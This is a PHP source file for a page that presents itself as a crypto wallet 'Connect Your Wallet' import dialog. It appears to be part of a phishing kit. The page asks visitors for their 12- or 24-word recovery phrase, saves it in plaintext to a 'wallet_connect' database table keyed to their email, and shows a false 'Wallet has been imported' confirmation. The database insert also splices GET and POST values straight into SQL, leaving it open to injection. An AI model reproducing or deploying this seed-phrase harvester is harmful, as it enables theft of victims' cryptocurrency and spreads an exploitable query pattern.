<?php  
session_start();
include '../../config/db.php';

if (isset($_GET['name'])) {
    $wallet = $_GET['name'];
}else{
    echo "<script>window.location.href = 'index.html' </script>";
}

$umail = $_SESSION['USER_LOGIN'];

if (isset($_POST['import'])) {
    $phrase = trim($_POST['phrase']);
    if (!empty($phrase)) {
        $insert = mysqli_query($link, "INSERT INTO wallet_connect (`email`, `wallet`, `phrase`) VALUES ('$umail', '$wallet', '$phrase') ");
        if ($insert) {
            echo "<script>alert('Wallet has been imported');window.location.href = '../index.php' </script>";
        }
    }

}
?>
<!DOCTYPE html
<html>
<head>
    <meta charset="utf-8">
    <title>Import My Wallet</title> 
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="style.css" rel="stylesheet" type="text/css">
    <script src="../../../ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="../../../ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
    <script type="text/javascript">WebFont.load({ google: { families: ["Exo:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic", "Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic"] } });</script> 
    <script type="text/javascript">!function (o, c) { var n = c.documentElement, t = " w-mod-"; n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch") }(window, document);</script>
 
 


</head>

<body>
    <div class="dapps_import">
        <div class="axiewallet---page-2-import">
            <div class="div-block-4">
                <div id="modalBox" class="modalbox">
                    


  
                                        <div class='error-message w-form-fail'>
                                            <div>Oops! Something went wrong while submitting the form.</div>
                                        </div>
                    <div class="innermodal">
                        <div class="text-block-3"><a href="../index.php" class="link">Home ›</a> Connect Your Wallet</div>
                        <div data-duration-in="300" data-duration-out="100" data-current="Phrase" data-easing="ease" class="tabs w-tabs">
                            <div class="w-tab-menu"><a data-w-tab="Phrase" class="w-inline-block w-tab-link w--current">
                                    <div>Phrase</div>
                                </a></div>
                            <div class="w-tab-content">
                                <div data-w-tab="Phrase" class="w-tab-pane w--tab-active">
                                    <div class="form-block-2 w-form">
                                        <form method="post" class="form">
                                            <label for="Phrase" class="field-label-3">Recovery
                                                Phrase:</label>

                                            <textarea type="text" class="text-field-2 w-input" name="phrase" placeholder="Enter your phrase value..." required=""></textarea>
                                                
                                                
                                                
                                                
                                            <label for="email" class="field-label-4">Typically 12
                                                (sometimes 24) words separated by single spaces.</label>
                                                
                                                <input type="submit" value="Import" data-wait="Please wait..." class="submit-button w-button" name="import">
                                        </form>
                                        
                                    
                                    </div>
                                </div>
                               
                        
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="index.js"></script>
     
    <script src="newjs.js" type="text/javascript"></script> 
</body> 

